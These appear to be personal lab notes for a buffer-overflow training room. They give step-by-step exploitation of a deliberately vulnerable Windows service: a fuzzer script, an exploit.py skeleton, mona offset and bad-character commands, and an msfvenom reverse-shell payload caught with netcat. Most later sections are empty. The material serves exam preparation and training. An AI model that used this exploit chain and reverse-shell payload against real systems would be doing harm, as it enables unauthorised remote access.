# OSCP BOF Prep

## Overview

This room uses 32-bit Windows 7 VM

`xfreerdp /u:admin /p:password /cert:ignore /v:10.10.219.155`

On your Desktop there should be a folder called "vulnerable-apps".
Inside this folder are a number of binaries which are vulnerable to simple
stack based buffer overflows (the type taught on the PWK/OSCP course):

- The SLMail installer.
- The brainpan binary.
- The dostackbufferoverflowgood binary.
- The vulnserver binary.
- A custom written "oscp" binary which contains 10 buffer overflows,
each with a different EIP offset and set of badchars.

I have also written a handy guide to exploiting buffer overflows with the help
of mona:
[guide](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)

## Overflow 1

Right-click the Immunity Debugger icon on the Desktop and choose
"Run as administrator".

When Immunity loads, click the open file icon, or choose File -> Open.
Navigate to the vulnerable-apps folder on the admin user's desktop,
and then the "oscp" folder. Select the "oscp" (oscp.exe) binary and click "Open".

The binary will open in a "paused" state,
so click the red play icon or choose Debug -> Run.
In a terminal window, the oscp.exe binary should be running,
and tells us that it is listening on port 1337.

On your Kali box, connect to port 1337 on 10.10.219.155 using netcat:

`nc 10.10.219.155 1337`

Type "HELP" and press Enter.
Note that there are 10 different OVERFLOW commands numbered 1 - 10.
Type "OVERFLOW1 test" and press enter.
The response should be "OVERFLOW1 COMPLETE". Terminate the connection.

#### Mona Configuration

The mona script has been preinstalled, however to make it easier to work with,
you should configure a working folder using the following command,
which you can run in the command input box at the bottom of the Immunity Debugger
window:

`!mona config -set workingfolder c:\mona\%p`

### Fuzzing

Create a file on your Kali box called fuzzer.py with the following contents:

```python
import socket, time, sys

ip = "MACHINE_IP"
port = 1337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

Run the fuzzer.py script using python: `python fuzzer.py`

The fuzzer will send increasingly long strings comprised of As (up to 3000).
If the fuzzer crashes the server with one of the strings,
you should see an error like: "Could not connect to MACHINE_IP:1337".
Make a note of the largest number of bytes that were sent.

### Crash Replication & Controlling EIP

Create another file on your Kali box called exploit.py with the following contents:

```python
import socket

ip = "10.10.44.251"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

Run the following command to generate a cyclic pattern of a length 400 bytes
longer that the string that crashed the server (change the -l value to this):

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400`

Copy the output and place it into the payload variable of the exploit.py script.

On Windows, in Immunity Debugger,
re-open the oscp.exe again using the same method as before,
and click the red play icon to get it running.
You will have to do this prior to each time we run the exploit.py
(which we will run multiple times with incremental modifications).

On Kali, run the modified exploit.py script: `python exploit.py`

The script should crash the oscp.exe server again.
This time, in Immunity Debugger,
in the command input box at the bottom of the screen,
run the following mona command,
changing the distance to the same length as the pattern you created:

`!mona findmsp -distance 2400`

Mona should display a log window with the output of the command.
If not, click the "Window" menu and then "Log data" to view it
(choose "CPU" to switch back to the standard view).

In this output you should see a line which states:

`EIP contains normal pattern : ... (offset 1978)`

Update your exploit.py script and set the offset variable to this value
(was previously set to 0). Set the payload variable to an empty string again.
Set the retn variable to "BBBB".

Restart oscp.exe in Immunity and run the modified exploit.py script again.
The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

### Finding Bad Characters

Generate a bytearray using mona, and exclude the null byte (\x00) by default.
Note the location of the bytearray.bin file that is generated
(if the working folder was set per the Mona Configuration section of this guide,
then the location should be C:\mona\oscp\bytearray.bin).

`!mona bytearray -b "\x00"`

Now generate a string of bad chars that is identical to the bytearray.
The following python script can be used to generate a string of bad chars from
\x01 to \xff:

```python
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
```

Update your exploit.py script and set the payload variable to the string of
bad chars the script generates.

Restart oscp.exe in Immunity and run the modified exploit.py script again.
Make a note of the address to which the ESP register points and use it in the
following mona command:

`!mona compare -f C:\mona\oscp\bytearray.bin -a 01A5FA30`

A popup window should appear labelled "mona Memory comparison results".
If not, use the Window menu to switch to it.
The window shows the results of the comparison,
indicating any characters that are different in memory to what they are in the
generated bytearray.bin file.

Not all of these might be badchars!
Sometimes badchars cause the next byte to get corrupted as well,
or even effect the rest of the string.

The first badchar in the list should be the null byte (\x00) since we already
removed it from the file.
Make a note of any others.

`00 07 08 2e 2f a0 a1`

Generate a new bytearray in mona, specifying these new badchars along with \x00.

`!mona bytearray -b "\x00\x07\x08\x2e\x2f\xa0\xa1"`

Then update the payload variable in your exploit.py script and remove the
new badchars as well.

Restart oscp.exe in Immunity and run the modified exploit.py script again.
Repeat the badchar comparison until the results status returns "Unmodified".
This indicates that no more badchars exist.

`!mona compare -f C:\mona\oscp\bytearray.bin -a 018CFA30`

### Finding a Jump Point

With the oscp.exe either running or in a crashed state,
run the following mona command,
making sure to update the -cpb option with all the badchars you identified
(including \x00):

`!mona jmp -r esp -cpb "\x00\x07\x08\x2e\x2f\xa0\xa1"`

This command finds all "jmp esp" (or equivalent) instructions with addresses
that don't contain any of the badchars specified.
The results should display in the "Log data" window
(use the Window menu to switch to it if needed).

Choose an address and update your exploit.py script,
setting the "retn" variable to the address,
written backwards (since the system is little endian).
For example if the address is \x01\x02\x03\x04 in Immunity,
write it as \x04\x03\x02\x01 in your exploit.

`\xaf\x11\x50\x62`

### Generate Payload

Run the following msfvenom command on Kali, using your Kali VPN IP as the
LHOST and updating the -b option with all the badchars you identified
(including \x00):

`msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py`

Copy the generated python code and integrate it into your exploit.py script,
e.g. by setting the payload variable equal to the buf variable from the code.

### Prepend NOPs

Since an encoder was likely used to generate the payload,
you will need some space in memory for the payload to unpack itself.
You can do this by setting the padding variable to a string of 16 or more
"No Operation" (\x90) bytes:

`padding = "\x90" * 16`

Exploit!

With the correct prefix, offset, return address, padding, and payload set,
you can now exploit the buffer overflow to get a reverse shell.

Start a netcat listener on your Kali box using the LPORT you specified in the
msfvenom command (4444 if you didn't change it).

Restart oscp.exe in Immunity and run the modified exploit.py script again.
Your netcat listener should catch a reverse shell!

[Tib3rius_notes](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)

## Overflow 2

`Crashed at 700 bytes`

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1100`

`EIP: 0x76413176 (634)`

`ESP: 018AFA30`

`00 01 02 03 04 23 24 3c 3d 83 84 ba bb`

## Overflow 3

`Crashed at 700 bytes`

## Overflow 4

## Overflow 5

## Overflow 6

## Overflow 7

## Overflow 8

## Overflow 9

## Overflow 10

```json
```
